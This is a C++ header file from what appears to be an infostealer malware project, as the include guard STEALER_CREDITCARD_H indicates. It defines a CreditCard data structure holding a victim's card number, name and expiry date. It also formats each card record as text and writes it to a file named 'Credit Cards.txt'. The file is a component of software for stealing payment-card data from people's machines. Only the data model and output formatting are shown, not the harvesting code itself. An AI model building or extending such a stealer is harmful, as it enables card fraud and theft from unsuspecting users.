//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_CREDITCARD_H
#define STEALER_CREDITCARD_H

#include "../Includes.h"
#include "Entity.h"

struct CreditCard : public Entity {
    std::string name_on_card = "Unknown";
    std::string card_number = "Unknown";
    int expiration_month;
    int expiration_year;

    bool canBeWrite() override {
        return !(name_on_card.empty() && card_number.empty() && 0 == expiration_year && 0 == expiration_month);
    }

    std::string toString() override {
        return  "Card: " + this->card_number + "\n" +
                "  Expiration: " + std::to_string(this->expiration_month) + "/" + std::to_string(this->expiration_year) + "\n" +
                "  Name: " + this->name_on_card;
    }

    std::string getFileName() override {
        return "Credit Cards.txt";
    }
};

#endif //STEALER_CREDITCARD_H
